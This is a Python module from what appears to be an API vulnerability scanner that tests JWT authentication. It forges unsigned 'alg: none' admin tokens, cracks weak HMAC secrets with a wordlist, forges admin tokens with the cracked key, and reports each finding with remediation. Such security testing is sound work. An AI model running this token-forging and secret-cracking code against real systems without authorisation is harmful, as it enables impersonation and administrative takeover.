import base64
import json
import time
import os
import jwt
from typing import List
from .base import BaseModule
from ..core.vulnerability import Vulnerability

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode("utf-8").rstrip("=")

class AuthJwtScanner(BaseModule):
    name = "Authentication & JWT Security Scanner"
    description = "Tests for JWT 'alg: none' bypass, weak HMAC secrets, and token validation flaws"
    category = "API2:2023 - Broken Authentication"

    def run(self) -> List[Vulnerability]:
        findings = []

        # 1. Baseline Login to obtain a valid sample token
        login_res, login_req_poc, login_res_poc = self.requester.request(
            method="POST",
            path="/api/v1/auth/login",
            json_data={
                "username": self.config.get("test_accounts.bob.username", "bob"),
                "password": self.config.get("test_accounts.bob.password", "Password123!")
            }
        )

        if login_res.status_code != 200:
            return findings

        data = login_res.json()
        token = data.get("access_token")
        if not token:
            return findings

        # Store bob's token in shared context
        self.context["bob_token"] = token

        # Also get alice's token for BOLA tests later
        alice_res, _, _ = self.requester.request(
            method="POST",
            path="/api/v1/auth/login",
            json_data={
                "username": self.config.get("test_accounts.alice.username", "alice"),
                "password": self.config.get("test_accounts.alice.password", "Password123!")
            }
        )
        if alice_res.status_code == 200:
            self.context["alice_token"] = alice_res.json().get("access_token")

        # TEST A: JWT 'alg: none' Signature Bypass
        try:
            parts = token.split(".")
            if len(parts) == 3:
                payload_json = json.loads(base64.urlsafe_b64decode(parts[1] + "==").decode("utf-8"))
                
                # Create a forged admin payload
                forged_payload = dict(payload_json)
                forged_payload["sub"] = "4"
                forged_payload["user_id"] = 4
                forged_payload["username"] = "admin"
                forged_payload["role"] = "admin"
                forged_payload["is_admin"] = True

                none_header = {"alg": "none", "typ": "JWT"}
                header_b64 = b64url_encode(json.dumps(none_header, separators=(',', ':')).encode())
                payload_b64 = b64url_encode(json.dumps(forged_payload, separators=(',', ':')).encode())
                
                # alg: none token has empty signature: header.payload.
                none_token = f"{header_b64}.{payload_b64}."

                test_res, test_req_poc, test_res_poc = self.requester.request(
                    method="GET",
                    path="/api/v1/documents/1",
                    token=none_token
                )

                if test_res.status_code == 200:
                    findings.append(Vulnerability(
                        vuln_id="VAPT-AUTH-001",
                        title="JWT Signature Bypass via 'alg: none' Algorithm",
                        severity="CRITICAL",
                        cvss_score=9.8,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                        owasp_category="API2:2023 - Broken Authentication",
                        cwe_id="CWE-347: Improper Verification of Cryptographic Signature",
                        endpoint="ALL Protected Endpoints (e.g. /api/v1/documents/{id})",
                        method="GET / POST / PUT / DELETE",
                        description=(
                            "The server's JWT verification implementation accepts unverified tokens with header "
                            "'alg': 'none'. This allows unauthenticated external attackers to forge arbitrary tokens "
                            "with administrative claims (user_id: 4, role: admin) without possessing the cryptographic secret."
                        ),
                        business_impact=(
                            "Complete compromise of user authentication and tenant isolation. An attacker can "
                            "impersonate any user, including system administrators, view confidential data, and modify system state."
                        ),
                        remediation=(
                            "1. Explicitly specify allowed algorithms during verification (e.g., algorithms=['HS256']).\n"
                            "2. Completely disable and reject tokens with 'alg': 'none'.\n"
                            "3. Ensure the JWT library enforces strict cryptographic signature checks on all incoming tokens."
                        ),
                        poc_request=test_req_poc,
                        poc_response=test_res_poc,
                        evidence=f"Server returned HTTP 200 OK when presented with unsigned 'alg: none' token for user_id=4: {none_token}"
                    ))
        except Exception as e:
            pass

        # TEST B: Weak HMAC Secret Key (Offline Dictionary Attack)
        wordlist_path = os.path.join(
            os.path.dirname(os.path.dirname(__file__)), "wordlists", "jwt_secrets.txt"
        )
        if os.path.exists(wordlist_path):
            with open(wordlist_path, "r", encoding="utf-8") as f:
                secrets = [line.strip() for line in f if line.strip()]

            cracked_secret = None
            for candidate in secrets:
                try:
                    jwt.decode(token, candidate, algorithms=["HS256"], options={"verify_signature": True, "verify_exp": False})
                    cracked_secret = candidate
                    break
                except jwt.InvalidSignatureError:
                    continue
                except Exception:
                    continue

            if cracked_secret:
                # Prove exploitability by crafting forged token with cracked secret
                forged_admin_token = jwt.encode(
                    {
                        "sub": "4",
                        "user_id": 4,
                        "username": "admin",
                        "role": "admin",
                        "is_admin": True,
                        "exp": time.time() + 3600
                    },
                    cracked_secret,
                    algorithm="HS256"
                )

                forge_res, forge_req_poc, forge_res_poc = self.requester.request(
                    method="GET",
                    path="/api/v1/users/4/profile",
                    token=forged_admin_token
                )

                findings.append(Vulnerability(
                    vuln_id="VAPT-AUTH-002",
                    title="Weak / Guessable JWT HMAC Secret Key",
                    severity="HIGH",
                    cvss_score=8.5,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
                    owasp_category="API2:2023 - Broken Authentication",
                    cwe_id="CWE-798: Use of Hard-coded or Weak Cryptographic Credentials",
                    endpoint="/api/v1/auth/login",
                    method="POST",
                    description=(
                        f"The API signs JSON Web Tokens (HS256) using a weak, dictionary-guessable secret key ('{cracked_secret}'). "
                        "Because HS256 is a symmetric signing algorithm, knowledge of the shared secret allows attackers "
                        "to generate arbitrary valid JWT tokens for any user or administrative account."
                    ),
                    business_impact=(
                        "Attackers can forge valid authentication tokens at will, bypassing identity verification "
                        "and gaining full administrative privileges across the API."
                    ),
                    remediation=(
                        "1. Generate high-entropy, cryptographically random secret keys of at least 256 bits (32+ bytes).\n"
                        "2. Store secrets securely in environment variables or an enterprise secrets manager (e.g. HashiCorp Vault, AWS Secrets Manager).\n"
                        "3. Consider asymmetric signing algorithms such as RS256 or ES256."
                    ),
                    poc_request=forge_req_poc,
                    poc_response=forge_res_poc,
                    evidence=f"Successfully cracked JWT HMAC secret: '{cracked_secret}' via dictionary attack and forged valid token."
                ))

        # TEST C: Missing Authentication on Sensitive Endpoints
        anon_res, anon_req_poc, anon_res_poc = self.requester.request(
            method="GET",
            path="/api/v1/documents/1"
        )
        if anon_res.status_code == 200:
            findings.append(Vulnerability(
                vuln_id="VAPT-AUTH-003",
                title="Missing Authentication on Sensitive Endpoint",
                severity="HIGH",
                cvss_score=7.5,
                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
                owasp_category="API2:2023 - Broken Authentication",
                cwe_id="CWE-306: Missing Authentication for Critical Function",
                endpoint="/api/v1/documents/{id}",
                method="GET",
                description="The endpoint returned sensitive document data to an unauthenticated client request.",
                business_impact="Unauthorized disclosure of internal documents to public clients.",
                remediation="Apply authentication middleware to require valid Bearer token headers.",
                poc_request=anon_req_poc,
                poc_response=anon_res_poc,
                evidence="Endpoint returned HTTP 200 OK without Authorization header."
            ))

        return findings
